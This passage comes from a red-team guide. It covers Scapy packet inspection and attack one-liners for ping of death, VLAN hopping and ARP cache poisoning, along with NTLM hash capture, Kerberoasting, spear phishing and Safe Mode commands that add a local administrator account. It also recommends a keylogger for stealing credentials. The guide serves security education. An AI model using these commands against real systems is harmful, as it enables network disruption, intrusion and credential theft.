test for vulnerability, network issues, and packet inspection.
### Viewing the packet
Scapy offers several ways for the end users to examine packets. Use the
following commands as a reference to get your desired output with the
example, packets=IP(dst=\"192.168.0.2\" ttl=14). You can customize the
packet protocol to your heart\'s content. Then you can use the following
methods to view the data:
**packets.summary()**: This provide short list of details such as the IP
protocol, source and destination address, and payload details
> **packets.nsummary()**: Gives the same result as the summary() with a
> packet number
**packets.show()**: This provides a much more organized display and
component details of the packet
**packets.show2()**: This is very similar to the previous function
except checksum is calculated **packets.psdump()**: Maps a PostScript
illustration explaining the breakdown of the packet
**packets.pdfdump()**: This provides a PDF Visual explaining the
breakdown of the packet **packets.sprintf()**: This returns field values
of the packet data in a string format
> **packet.decode_payload_as():** You may alter the decoding method of
> the payload using this function
>
> **ls(packets)**: This lists packet content values
>
> **hexdump(packets)**: This gives you the hexadecimal dump of the
> packet
**str(packets)**: This builds a packet with defaulted values If you have
a list of a [[pcap]{.underline}](https://www.peerlyst.com/tags/pcap)
file it may also be helpful to know the following to help you organize
the data to be more easily readable. We are going to be using what are
called lambda functions. Don\'t let the term intimidates you; they are
only capable of executing:
**filter()**: Provides a lambda function to filter the provided list of
packets
**plot()**: Plots a list of packets with the provided lambda function
**Make table()**: The table of table is also organized based on the
given lambda function
### Classical attacks:
-   Malformed packets:
> *send(IP(dst=\"10.1.1.5\", ihl=2, version=3)/ICMP())*
-   ### Ping of death:
> *send( fragment(IP(dst=\"10.0.0.5\")/ICMP()/(\"X\"\*60000)) )*
-   ### VLAN hopping
In very specific conditions, a double 802.1q encapsulation will make a
packet jump to another VLAN:
> *sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())*
-   ### Wireless sniffing:
> *sniff(iface=\"ath0\",prn=lambda x:x.sprintf(*
>
> *{Dot11Beacon:%Dot11.addr3%\\t%Dot11Beacon.info%\\t%PrismHeader.cha
> nnel%\\t%Dot11Beacon.cap%}\"))*
-   ### ARP poisoning commands
The following is an example of how to use scapy to poison the ARP cache
on a network. By using the following commands, the targeted device is
prevented from joining the gateway of the network. The commands direct
the attack to poison the ARP cache by using a VLAN hopping attack. That
is why we set /Dot1Q(vlan=1)/Dot1Q(vlan=2):
> *send( Ether(dst=XX-XX-XX-XX-XX)/ARP(op=\"who-has\", psrc=gateway,
> pdst=client), inter=RandNum(10,40), loop=1 )*
### Double 802.1q encapsulation:
> *send( Ether(dst=XX-XX-XX-XX-XX)/Dot1Q(vlan=1)/Dot1Q(vlan=2)*
>
> */ARP(op=\"who-has\", psrc=gateway, pdst=client), inter=*
### The short-cut:
> *arpcachepoison(target, victim, interval=60)*
## References and Further Reading
-   Applied Network Security\[Arthur Salmon-Warun Levesque-Michael
    McLafferty**\]**
-   Scapy Documentation\[Philippe Biondi and the Scapy community\]
-   Learn Ethical Hacking from Scratch\[Zaid Sabih\]
```{=html}
```
-   Fragmentation (Overlapping) Attacks One Year Later\...\[Antonios
    Atlasis\]
> Chapter 10
>
> **Network Domination & Persistence**
>
> Contributor: Ian Barwise
Achieving domination of the
[network](https://www.peerlyst.com/tags/network) requires continued
[stealth](https://www.peerlyst.com/tags/stealth) but also
[knowledge](https://www.peerlyst.com/tags/knowledge) of the target
[OS](https://www.peerlyst.com/tags/os) environment. Once an
[attacker](https://www.peerlyst.com/tags/attacker) has gained
[access](https://www.peerlyst.com/tags/access) to the system they will
attempt to remain hidden and elevate permissions on the network. There
are several methods for achieving network dominance and stealth. If an
attacker's existence were to be discovered on the network, then
there is a high [probability](https://www.peerlyst.com/tags/probability)
that the attacker will lose network or client access and possibly
[risk](https://www.peerlyst.com/tags/risk) losing all of the
[time](https://www.peerlyst.com/tags/time), effort, and
[resources](https://www.peerlyst.com/tags/resources) they invested in
gaining system access to begin with. It is relatively safe to assume
that once a system's defenses have been
[compromised](https://www.peerlyst.com/tags/compromised), an attacker
will attempt to plant more than one
[backdoor](https://www.peerlyst.com/tags/backdoor) to regain entry to
the system for future
[exploitation](https://www.peerlyst.com/tags/exploitation) perhaps
utilizing some type of [Remote
Access](https://www.peerlyst.com/tags/remote-access)
[Tool](https://www.peerlyst.com/tags/tool) (RAT) or other technique.
Once an attacker has established a foothold within the
[Enterprise](https://www.peerlyst.com/tags/enterprise) by gaining
system-level access, sadly it is usually quite a simple task to elevate
permissions to the [domain](https://www.peerlyst.com/tags/domain) or
even enterprise admin level. Let's explore some methods of accomplishing
this that focus on [Windows](https://www.peerlyst.com/tags/windows)
[systems](https://www.peerlyst.com/tags/systems) specifically as
[Linux](https://www.peerlyst.com/tags/linux) OS
[exploits](https://www.peerlyst.com/tags/exploits) are covered elsewhere
within this Guide.
![](media/image82.jpeg)Gaining [domain
admin](https://www.peerlyst.com/tags/domain-admin) --- a scary
proposition for all [IT
departments](https://www.peerlyst.com/tags/it-departments); shock & awe
best conveyed by Shelley Duvall's expression in [The
Shining](https://www.independent.co.uk/arts-entertainment/films/news/the-shining-7-things-you-never-knew-about-the-classic-horror-film-according-to-the-grady-twins-a6717986.html)
## Gaining Domain Admin
When encountering older Windows OS environments, [Red
Teamers](https://www.peerlyst.com/tags/red-teamers) may well be able to
[obtain](https://medium.com/%40adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
[NTLMv1 and NTLMv2 hashes
along](https://medium.com/%40adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
with recovered [credentials](https://www.peerlyst.com/tags/credentials)
by intercepting [hashes](https://www.peerlyst.com/tags/hashes) using a
packet [sniffing](https://www.peerlyst.com/tags/sniffing) tool such as
*[Inveigh](https://github.com/Kevin-Robertson/Inveigh),
[Impacket](https://github.com/SecureAuthCorp/impacket), or
[Wireshark](https://www.wireshark.org/)*. *Inveigh* is a [.NET
framework](https://www.peerlyst.com/tags/net-framework) packet
[sniffer](https://www.peerlyst.com/tags/sniffer) that listens for and
responds to LLMNR/mDNS/NBNS requests while also capturing incoming
NTLMv1/NTLMv2
[authentication](https://www.peerlyst.com/tags/authentication) attempts
over the Windows
[Server](https://www.peerlyst.com/tags/server-message-block) [Message
Block](https://www.peerlyst.com/tags/server-message-block) (SMB)
service. *Inveigh* was designed to be used in combination with Windows
[PowerShell](https://www.peerlyst.com/tags/powershell) to
[spoof](https://www.peerlyst.com/tags/spoof) ADIDNS,
[LLMNR](https://www.peerlyst.com/tags/llmnr), mDNS, NBNS and conduct
[man-in-the-middle](https://www.peerlyst.com/tags/man-in-the-middle)
(MITM) attacks. Using *Inveigh* has the advantage of avoiding
[port](https://www.peerlyst.com/tags/port-27018) conflicts with default
running
services and it also contains HTTP/HTTPS/Proxy listeners for capturing
incoming authentication requests and performing attacks. Inveigh relies
on creating multiple run spaces to load the
sniffer, listeners, and control functions within a single shell and
PowerShell process.
![](media/image83.jpeg)Using Inveigh to obtain NTLMv1/NLTMv2 hashes;
image courtesy of [Github](https://github.com/Kevin-Robertson/Inveigh)
![](media/image84.jpeg)Using Impacket for SMB/NTLM relays; image
courtesy of
[DiabloHorn](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/)
[Wireshark](https://www.peerlyst.com/tags/wireshark) is another
well-known [packet
capture](https://www.peerlyst.com/tags/packet-capture) and [network
protocol](https://www.peerlyst.com/tags/network-protocol) analyzer that
is compatible with
[Windows,](https://www.peerlyst.com/tags/windows-2004) Linux,
[macOS](https://www.peerlyst.com/tags/macos), Solaris,
[FreeBSD](https://www.peerlyst.com/tags/freebsd), NetBSD, and other OS
in either Graphical User
[Interface](https://www.peerlyst.com/tags/interface) (GUI) or [command
line](https://www.peerlyst.com/tags/command-line) mode. What is great
about Wireshark is that it allows Red Teamers to be able to intercept
and analyze live data from Ethernet,
[IEEE](https://www.peerlyst.com/tags/ieee) 802.11 (Wi-Fi), PPP/HDLC,
[ATM](https://www.peerlyst.com/tags/atm),
[Bluetooth](https://www.peerlyst.com/tags/bluetooth),
[USB](https://www.peerlyst.com/tags/usb),
[Token](https://www.peerlyst.com/tags/token) Ring, Frame Relay, FDDI,
and others (depending on your platform). Additionally, it offers
[decryption](https://www.peerlyst.com/tags/decryption) support for many
[protocols](https://www.peerlyst.com/tags/protocols), including
[IPsec](https://www.peerlyst.com/tags/ipsec), ISAKMP,
[Kerberos](https://www.peerlyst.com/tags/kerberos), SNMPv3, SSL/TLS,
[WEP](https://www.peerlyst.com/tags/wep), and WPA/WPA2.
![](media/image85.jpeg)Wireshark packet captures; image courtesy of
Wireshark
In addition to the decryption support offered by tools such as
*Wireshark*, Red Teamers can use software tools that come pre-loaded in
the [Kali Linux](https://www.peerlyst.com/tags/kali-linux) image such as
*[Metasploit's SMB
Capture](https://www.offensive-security.com/metasploit-unleashed/server-capture-auxiliary-modules/)*
or *[Responder](https://github.com/lgandx/Responder)* to crack
intercepted NTLMv1/NTLMv2 hashes.
![](media/image86.jpeg)[Metasploit](https://www.peerlyst.com/tags/metasploit)
[SMB](https://www.peerlyst.com/tags/smb) Capture 1; courtesy of
[Offensive
Security](https://www.offensive-security.com/metasploit-unleashed/server-capture-auxiliary-modules/)
![](media/image87.jpeg)Metasploit SMB Capture 2; courtesy of [Offensive
Security](https://www.offensive-security.com/metasploit-unleashed/server-capture-auxiliary-modules/)
![](media/image88.jpeg)Responder; image courtesy [of
4ARMED](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
![](media/image89.jpeg)Responder; image courtesy of
[aptive.co.uk](https://www.aptive.co.uk/blog/llmnr-nbt-ns-spoofing/)
As unlikely as it may seem, there are still places running Windows 98,
ME, NT, 2000, and XP on their computer systems. Many organizations have
refused to upgrade their computer technology either due to
[budget](https://www.peerlyst.com/tags/budget) limitations or legacy
system [code](https://www.peerlyst.com/tags/code) that won't
[mesh](https://www.peerlyst.com/tags/mesh) well with newer
[operating](https://www.peerlyst.com/tags/operating) systems. This
presents an enormously dangerous window of opportunity for attackers to
exploit. Using a [password
cracking](https://www.peerlyst.com/tags/password-cracking) tool such as
[*John the Ripper*](https://www.openwall.com/john/), Red Teamers can
easily crack NTLMv1/NTLMv2 hashes and gain domain
[administrator](https://www.peerlyst.com/tags/administrator) permissions
on an older Windows OS. Of
[course](https://www.peerlyst.com/tags/course), not everyone is still
running outdated, end-of-life software anymore. Some organizations are
more advanced with newer [IT
infrastructure](https://www.peerlyst.com/tags/it-infrastructure)
components and software.
For newer versions of Windows, there are other methods of gaining domain
admin such as sending spear [phishing
emails](https://www.peerlyst.com/tags/phishing-emails) that contain
[malicious](https://www.peerlyst.com/tags/malicious)
[payloads](https://www.peerlyst.com/tags/payloads) disguised as
something else (e.g., a cleverly named MS Word .docx file with
[macros](https://www.peerlyst.com/tags/macros) that run VB scripts).
[Spear phishing](https://www.peerlyst.com/tags/spear-phishing), however,
is a technique that could take up too much precious time that Red
Teamers simply don't have depending on the specific timeframe they are
operating within (e.g., often it is commonly limited to 5-working days
maximum contract length).
![](media/image90.jpeg)Sample spear [phishing
email](https://www.peerlyst.com/tags/phishing-email)
[attack](https://www.peerlyst.com/tags/attack) against USAA; courtesy of
[AF.mil](https://www.andersen.af.mil/News/Features/Article/415586/spear-phishing-attacks-target-special-interests/)
## Kerberoasting
![](media/image91.jpeg)Kerberos the 3-headed mythical beast guarding the
gates of Hell; courtesy of
[thewordisbond.com](https://www.thewordisbond.com/twib-exclusive-three-headed-beast-time-to-feast/)
![](media/image92.jpeg)Kerberos, besides being a mythical 3-headed
creature is also, of course, a network
[authentication](https://www.peerlyst.com/tags/authentication-protocol)
[protocol](https://www.peerlyst.com/tags/authentication-protocol) in the
[IT security](https://www.peerlyst.com/tags/it-security) domain that
uses a ticket-granting system to provide strong authentication for
client/server applications using secret-key cryptography. Kerberoasting
is a technique that abuses Kerberos and that doesn't require elevated
permissions, allowing attackers to obtain
[service](https://www.peerlyst.com/tags/service) account
[passwords](https://www.peerlyst.com/tags/passwords) by obtaining a
listing of Service Principle Name (SPNs) values for user accounts. A
thorough explanation of exactly how Kerberoasting works is beyond the
scope of this chapter, but readers are welcome to dig further
[here](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)
or elsewhere if so desired.
Using PowerShell to request service account SPNs; image courtesy of
[STEALTHbits](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)
[Technologies](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)
![](media/image93.jpeg)Using
[Mimikatz](https://www.peerlyst.com/tags/mimikatz) to extract Kerberos
service [tickets](https://www.peerlyst.com/tags/tickets); courtesy of
[Mimikatz](https://adsecurity.org/?page_id=1821)
## Gaining Asset Admin
If you have [physical
access](https://www.peerlyst.com/tags/physical-access) to a Windows
computer, then there are several methods of owning the system. One
relatively easy method that doesn't involve any [hardware
hacking](https://www.peerlyst.com/tags/hardware-hacking) or external
[devices](https://www.peerlyst.com/tags/devices) to gain local
administrator access on the asset by rebooting the Windows OS computer
in Safe Mode which, by default,
[logs](https://www.peerlyst.com/tags/logs) the user back into the
machine as the local administrator
account with limited functionality. Safe mode
[boot](https://www.peerlyst.com/tags/boot) can be done from the command
prompt or by power cycling the computer and entering the
[BIOS](https://www.peerlyst.com/tags/bios) to select the safe mode boot
option.
If the safe mode user account is password-protected, try pressing enter
without entering a [password](https://www.peerlyst.com/tags/password),
or trying using the default user Windows password if you happen to know
it. This [hack](https://www.peerlyst.com/tags/hack) will not work
without being able to [log](https://www.peerlyst.com/tags/log) into the
computer in Safe mode. Once in Safe Mode, open Cmd.exe and change
directories to:
> *C:\\WINDOWS\\system32\>net user pentester1 /ADD* Next, create the new
> account password by entering: *C:\\WINDOWS\\system32\>net user
> pentester1 \**
Once the password for the new account has been created, then add the new
account to the local
administrator group:
> *C:\\WINDOWS\\system32\>net localgroup administrators pentester1*
>
> ![](media/image94.jpeg)*/ADD*
Privilege Escalation attack on Windows 10 machine from Safe Mode
![](media/image95.jpeg)Next, from the command prompt, type "msconfig"
which will open the System
[Configuration](https://www.peerlyst.com/tags/configuration)
[GUI](https://www.peerlyst.com/tags/gui) and navigate to the "Boot" tab
to unselect "Safe boot," and click "OK." Lastly, restart the computer in
regular boot mode and log in with your newly established administrator
account.
MSCONFIG Boot Settings restored to normal boot (uncheck Safe boot)
Depending on how much time the Red
[Team](https://www.peerlyst.com/tags/team) has, they might also choose
to install a [keylogger](https://www.peerlyst.com/tags/keylogger) on a
target system to capture all of the keystrokes entered.
*[Spyrix](http://www.spyrix.com/)* offers a
[free](https://www.peerlyst.com/tags/free) keylogger that is
an excellent option. By installing a keylogger, the attackers will
capture account [login](https://www.peerlyst.com/tags/login) credentials
that can be used by the attacker or that enable privilege escalation.
*Spyrix* allows for remote monitoring and data is saved to the Cloud. If
possible, the attackers will attempt to blend in and the
[stolen](https://www.peerlyst.com/tags/stolen) user credentials (esp.
for an administrator account) will allow them to act as a verified
system user on the network.
## Exfiltrating Sensitive Data